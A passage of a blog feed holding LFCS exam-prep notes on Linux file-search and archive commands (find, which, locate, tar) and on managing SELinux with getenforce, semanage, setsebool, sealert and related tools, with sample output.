<li><p>print # print full filename to stdout, followed by newline</p></li>
<li><p>name &ldquo;value&rdquo; # find values that start with the name</p></li>
<li><p>iname # ignore case</p></li>
<li><p>not -name # not <name></p></li>
<li><p>size +/&ndash; c/k/m/G # size in bytes; + =larger than, &ndash; = smaller than; c = bytes, k = kilobytes, m = megabytes, G = gigabytes</p></li>
<li><p>mtime # modification time</p></li>
<li><p>atime # access time</p></li>
</ul>


<h4>which</h4>

<blockquote><p>shows the full path of (shell) commands. It does this by searching for an executable or script in the directories listed in the environment variable PATH</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>which python
</span><span class='line'>/usr/bin/python</span></code></pre></td></tr></table></div></figure>


<h4>locate</h4>

<blockquote><p>find files by name. Reads one or more databases prepared by updatedb(8) and writes file names matching at least one of the PATTERNs to  standard  output,  one  per line.</p></blockquote>

<p>It is much faster than find. On most systems, <em>locate</em> is a link to <em>slocate</em>, which includes security features that prevent users from seeing files in directories they shouldn&rsquo;t be able to access</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>locate tcpdump
</span><span class='line'>/usr/sbin/tcpdump
</span><span class='line'>/usr/share/bash-completion/completions/tcpdump
</span><span class='line'>/usr/share/doc/tcpdump-4.5.1
</span><span class='line'>/usr/share/doc/systemtap-client-3.0/examples/network/tcpdumplike.meta
</span><span class='line'>/usr/share/doc/systemtap-client-3.0/examples/network/tcpdumplike.stp
</span><span class='line'>/usr/share/doc/tcpdump-4.5.1/CHANGES
</span><span class='line'>/usr/share/doc/tcpdump-4.5.1/CREDITS
</span><span class='line'>/usr/share/doc/tcpdump-4.5.1/LICENSE
</span><span class='line'>/usr/share/doc/tcpdump-4.5.1/README.md
</span><span class='line'>/usr/share/man/man8/tcpdump.8.gz
</span><span class='line'>/usr/share/mime/application/vnd.tcpdump.pcap.xml
</span><span class='line'>/var/cache/man/cat8/tcpdump.8.gz</span></code></pre></td></tr></table></div></figure>


<h4>tar</h4>

<blockquote><p>saves many files together into a single tape or disk archive, and can restore individual files from the archive</p></blockquote>

<ul>
<li><p>c # create archive</p></li>
<li><p>t # list the contents of an archive</p></li>
<li><p>x # extract files from archive</p></li>
<li><p>v # verbosely list files processed</p></li>
<li><p>z # gzip compression</p></li>
<li><p>j # bzip compression</p></li>
<li><p>A # append files to existing archive</p></li>
<li><p>file # archive file</p></li>
<li><p>p # preserve permissions</p></li>
<li><p>W # attempt to verify the archive after writing it</p></li>
<li><p>&mdash;exclude=PATTERN # exclude files</p></li>
<li><p>create archive</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tar cvzf arhive.tar.gz Documents/
</span><span class='line'>Documents/
</span><span class='line'>Documents/test.txt
</span><span class='line'>Documents/archive_file
</span><span class='line'>[root@tron ~]# ls</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list files in archive_file</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tar tvf arhive.tar.gz
</span><span class='line'>drwxr-xr-x root/root         0 2017-09-08 17:54 Documents/
</span><span class='line'>-rw-r--r-- root/root        36 2017-09-08 17:53 Documents/test.txt
</span><span class='line'>-rw-r--r-- root/root         0 2017-09-08 17:54 Documents/archive_file</span></code></pre></td></tr></table></div></figure>


<ul>
<li>decompress gzip archive: <code>tar xzvf arhive.tar.gz</code></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Kindness is a language which the deaf \
</span><span class='line'>| can hear and the blind can read.      |
</span><span class='line'>|                                       |
</span><span class='line'>\ -- Mark Twain                         /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Managing SELinux]]></title>
    <link href="http://chousensha.github.io/blog/2018/02/23/lfcs-prep-managing-selinux/"/>
    <updated>2018-02-23T13:18:55-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/02/23/lfcs-prep-managing-selinux</id>
    <content type="html"><![CDATA[<p>In this post we&rsquo;ll go over using SELinux to manage the security of a Linux system.</p>

<p>NSA Security-Enhanced Linux or SELinux is a mandatory access control architecture controlled through the <code>/etc/selinux/config</code> file.</p>

<!-- more -->


<p>Let&rsquo;s take a peek at the file on my box:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/selinux/config 
</span><span class='line'>
</span><span class='line'># This file controls the state of SELinux on the system.
</span><span class='line'># SELINUX= can take one of these three values:
</span><span class='line'>#     enforcing - SELinux security policy is enforced.
</span><span class='line'>#     permissive - SELinux prints warnings instead of enforcing.
</span><span class='line'>#     disabled - No SELinux policy is loaded.
</span><span class='line'>SELINUX=enforcing
</span><span class='line'># SELINUXTYPE= can take one of three two values:
</span><span class='line'>#     targeted - Targeted processes are protected,
</span><span class='line'>#     minimum - Modification of targeted policy. Only selected processes are protected. 
</span><span class='line'>#     mls - Multi Level Security protection.
</span><span class='line'>SELINUXTYPE=targeted </span></code></pre></td></tr></table></div></figure>


<p>If SELinux is disabled and then enabled, all the files inside the filesystem will need to be re-labeled.</p>

<p>You can adjust SELinux with many commands and utilities:</p>

<h3>getenforce</h3>

<blockquote><p>get the current mode of SELinux</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>getenforce
</span><span class='line'>Enforcing</span></code></pre></td></tr></table></div></figure>


<h3>sestatus</h3>

<blockquote><p>SELinux status tool</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sestatus
</span><span class='line'>SELinux status:                 enabled
</span><span class='line'>SELinuxfs mount:                /sys/fs/selinux
</span><span class='line'>SELinux root directory:         /etc/selinux
</span><span class='line'>Loaded policy name:             targeted
</span><span class='line'>Current mode:                   enforcing
</span><span class='line'>Mode from config file:          enforcing
</span><span class='line'>Policy MLS status:              enabled
</span><span class='line'>Policy deny_unknown status:     allowed
</span><span class='line'>Max kernel policy version:      28</span></code></pre></td></tr></table></div></figure>


<h3>setenforce</h3>

<blockquote><p>modify the mode SELinux is running in</p>

<p>Use Enforcing or 1 to put SELinux in enforcing mode.
Use Permissive or 0 to put SELinux in permissive mode</p></blockquote>

<h3>SELinux log files:</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>tail /var/log/audit/audit.log | grep AVC
</span><span class='line'>type=USER_AVC msg=audit(1518200447.761:276): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=system_u:system_r:init_t:s0 msg='avc:  denied  { status } for auid=n/a uid=0 gid=0 path="/etc/fstab" cmdline="systemctl show --property=RequiredBy -- -.mount" scontext=system_u:system_r:initrc_t:s0 tcontext=unconfined_u:object_r:etc_t:s0 tclass=service  exe="/usr/lib/systemd/systemd" sauid=0 hostname=? addr=? terminal=?'</span></code></pre></td></tr></table></div></figure>


<h3>ausearch</h3>

<blockquote><p>a tool to query audit daemon logs</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ausearch -m avc
</span><span class='line'>----
</span><span class='line'>time-&gt;Wed Aug  3 15:23:45 2016
</span><span class='line'>type=SYSCALL msg=audit(1470227025.724:584): arch=c000003e syscall=49 success=no exit=-13 a0=6 a1=7efd495a23a8 a2=1c a3=7fff168b531c items=0 ppid=1 pid=8541 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="httpd" exe="/usr/sbin/httpd" subj=system_u:system_r:httpd_t:s0 key=(null)
</span><span class='line'>type=AVC msg=audit(1470227025.724:584): avc:  denied  { name_bind } for  pid=8541 comm="httpd" src=8888 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:unreserved_port_t:s0 tclass=tcp_socket</span></code></pre></td></tr></table></div></figure>


<h3>restorecon</h3>

<blockquote><p>restore file(s) default SELinux security contexts.</p></blockquote>

<h3>chcon</h3>

<blockquote><p>change file SELinux security context</p></blockquote>

<h3>semanage</h3>

<blockquote><p>SELinux Policy Management tool</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>semanage boolean -l | grep nfs
</span><span class='line'>xen_use_nfs                    (off  ,  off)  Allow xen to use nfs
</span><span class='line'>mpd_use_nfs                    (off  ,  off)  Allow mpd to use nfs
</span><span class='line'>virt_use_nfs                   (off  ,  off)  Allow virt to use nfs
</span><span class='line'>use_nfs_home_dirs              (off  ,  off)  Allow use to nfs home dirs
</span><span class='line'>ksmtuned_use_nfs               (off  ,  off)  Allow ksmtuned to use nfs
</span><span class='line'>nfsd_anon_write                (off  ,  off)  Allow nfsd to anon write
</span><span class='line'>git_system_use_nfs             (off  ,  off)  Allow git to system use nfs
</span><span class='line'>git_cgi_use_nfs                (off  ,  off)  Allow git to cgi use nfs
</span><span class='line'>logrotate_use_nfs              (off  ,  off)  Allow logrotate to use nfs
</span><span class='line'>cobbler_use_nfs                (off  ,  off)  Allow cobbler to use nfs
</span><span class='line'>httpd_use_nfs                  (off  ,  off)  Allow httpd to use nfs
</span><span class='line'>sge_use_nfs                    (off  ,  off)  Allow sge to use nfs
</span><span class='line'>sanlock_use_nfs                (off  ,  off)  Allow sanlock to use nfs
</span><span class='line'>samba_share_nfs                (off  ,  off)  Allow samba to share nfs
</span><span class='line'>ftpd_use_nfs                   (off  ,  off)  Allow ftpd to use nfs
</span><span class='line'>openshift_use_nfs              (off  ,  off)  Allow openshift to use nfs
</span><span class='line'>polipo_use_nfs                 (off  ,  off)  Allow polipo to use nfs
</span><span class='line'>tmpreaper_use_nfs              (off  ,  off)  Allow tmpreaper to use nfs
</span><span class='line'>nfs_export_all_rw              (on   ,   on)  Allow nfs to export all rw
</span><span class='line'>nfs_export_all_ro              (on   ,   on)  Allow nfs to export all ro</span></code></pre></td></tr></table></div></figure>


<ul>
<li>list ports</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>semanage port -l | grep ftp
</span><span class='line'>ftp_data_port_t                tcp      20
</span><span class='line'>ftp_port_t                     tcp      21, 989, 990
</span><span class='line'>ftp_port_t                     udp      989, 990
</span><span class='line'>tftp_port_t                    udp      69</span></code></pre></td></tr></table></div></figure>


<ul>
<li>change label</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>semanage fcontext --add -t &lt;type&gt; file</span></code></pre></td></tr></table></div></figure>


<p>You need to call restorecon after changing the context</p>

<h3>getsebool</h3>

<blockquote><p>get SELinux boolean value(s)</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>getsebool -a | grep ftp
</span><span class='line'>ftpd_anon_write --&gt; off
</span><span class='line'>ftpd_connect_all_unreserved --&gt; off
</span><span class='line'>ftpd_connect_db --&gt; off
</span><span class='line'>ftpd_full_access --&gt; off
</span><span class='line'>ftpd_use_cifs --&gt; off
</span><span class='line'>ftpd_use_fusefs --&gt; off
</span><span class='line'>ftpd_use_nfs --&gt; off
</span><span class='line'>ftpd_use_passive_mode --&gt; off
</span><span class='line'>httpd_can_connect_ftp --&gt; off
</span><span class='line'>httpd_enable_ftp_server --&gt; off
</span><span class='line'>tftp_anon_write --&gt; off
</span><span class='line'>tftp_home_dir --&gt; off</span></code></pre></td></tr></table></div></figure>


<h3>setsebool</h3>

<blockquote><p>set SELinux boolean value</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>setseebol &lt;boolean&gt; on/off</span></code></pre></td></tr></table></div></figure>


<ul>
<li>-P # make the change persistent to reboots</li>
</ul>


<h3>seinfo</h3>

<blockquote><p>SELinux policy query tool</p></blockquote>

<p>Install the <em>setools</em> package to get this utility</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>seinfo
</span><span class='line'>
</span><span class='line'>Statistics for policy file: /sys/fs/selinux/policy
</span><span class='line'>Policy Version & Type: v.28 (binary, mls)
</span><span class='line'>
</span><span class='line'>   Classes:            91    Permissions:       256
</span><span class='line'>   Sensitivities:       1    Categories:       1024
</span><span class='line'>   Types:            4729    Attributes:        251
</span><span class='line'>   Users:               8    Roles:              14
</span><span class='line'>   Booleans:          301    Cond. Expr.:       350
</span><span class='line'>   Allow:          101266    Neverallow:          0
</span><span class='line'>   Auditallow:        157    Dontaudit:        8030
</span><span class='line'>   Type_trans:      17756    Type_change:        74
</span><span class='line'>   Type_member:        35    Role allow:         39
</span><span class='line'>   Role_trans:        416    Range_trans:      5697
</span><span class='line'>   Constraints:       109    Validatetrans:       0
</span><span class='line'>   Initial SIDs:       27    Fs_use:             28
</span><span class='line'>   Genfscon:          105    Portcon:           597
</span><span class='line'>   Netifcon:            0    Nodecon:             0
</span><span class='line'>   Permissives:         6    Polcap:              2</span></code></pre></td></tr></table></div></figure>


<h3>sealert</h3>

<blockquote><p>sealert is the user interface component (either GUI or command line) to
the  setroubleshoot  system. setroubleshoot is used to diagnose SELinux
denials and attempts  to  provide  user  friendly  explanations  for  a
SELinux  denial (e.g. AVC) and recommendations for how one might adjust
the system to prevent the denial in the future.</p></blockquote>

<ul>
<li><p>-l # Lookup alert by id, if id is wildcard * then return all alerts</p></li>
<li><p>-a # Scan a log file, analyze its AVC&rsquo;s</p></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sealert -a /var/log/audit/audit.log
</span><span class='line'>100% done
</span><span class='line'>found 4 alerts in /var/log/audit/audit.log
</span><span class='line'>--------------------------------------------------------------------------------
</span><span class='line'>
</span><span class='line'>SELinux is preventing /usr/bin/pgrep from getattr access on the filesystem /sys.
</span><span class='line'>
</span><span class='line'>*****  Plugin catchall (100. confidence) suggests   **************************
</span><span class='line'>
</span><span class='line'>If you believe that pgrep should be allowed getattr access on the sys filesystem by default.
</span><span class='line'>Then you should report this as a bug.
</span><span class='line'>You can generate a local policy module to allow this access.
</span><span class='line'>Do
</span><span class='line'>allow this access for now by executing:
</span><span class='line'># ausearch -c 'pgrep' --raw | audit2allow -M my-pgrep
</span><span class='line'># semodule -i my-pgrep.pp
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Additional Information:
</span><span class='line'>Source Context                system_u:system_r:ksmtuned_t:s0
</span><span class='line'>Target Context                system_u:object_r:sysfs_t:s0
</span><span class='line'>Target Objects                /sys [ filesystem ]
</span><span class='line'>Source                        pgrep
</span><span class='line'>Source Path                   /usr/bin/pgrep
</span><span class='line'>Port                          &lt;Unknown&gt;
</span><span class='line'>Host                          &lt;Unknown&gt;
</span><span class='line'>Source RPM Packages           procps-ng-3.3.10-10.el7.x86_64
</span><span class='line'>Target RPM Packages           filesystem-3.2-21.el7.x86_64
</span><span class='line'>Policy RPM                    selinux-policy-3.13.1-102.el7_3.16.noarch
</span><span class='line'>Selinux Enabled               True
</span><span class='line'>Policy Type                   targeted
</span><span class='line'>Enforcing Mode                Enforcing
</span><span class='line'>Host Name                     rhel7
</span><span class='line'>Platform                      Linux rhel7 3.10.0-514.26.2.el7.x86_64 #1 SMP Fri
</span><span class='line'>                              Jun 30 05:26:04 UTC 2017 x86_64 x86_64
</span><span class='line'>Alert Count                   9
</span><span class='line'>First Seen                    2018-02-10 02:25:54 JST
</span><span class='line'>Last Seen                     2018-02-10 03:19:45 JST
</span><span class='line'>Local ID                      d5a68144-c84d-44c4-bde0-31380fd5bb60
</span><span class='line'>
</span><span class='line'>Raw Audit Messages
</span><span class='line'>type=AVC msg=audit(1518200385.729:205): avc:  denied  { getattr } for  pid=4616 comm="pgrep" name="/" dev="sysfs" ino=1 scontext=system_u:system_r:ksmtuned_t:s0 tcontext=system_u:object_r:sysfs_t:s0 tclass=filesystem
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>type=SYSCALL msg=audit(1518200385.729:205): arch=x86_64 syscall=statfs success=no exit=EACCES a0=7f9407f4e013 a1=7fffcd705e80 a2=fffffffffff476d8 a3=7fffcd705b90 items=0 ppid=4615 pid=4616 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm=pgrep exe=/usr/bin/pgrep subj=system_u:system_r:ksmtuned_t:s0 key=(null)
</span><span class='line'>
</span><span class='line'>Hash: pgrep,ksmtuned_t,sysfs_t,filesystem,getattr
</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> __________________________________
</span><span class='line'>/ Someone is speaking well of you. \
</span><span class='line'>|                                  |
</span><span class='line'>\ How unusual!                     /
</span><span class='line'> ----------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
</feed>
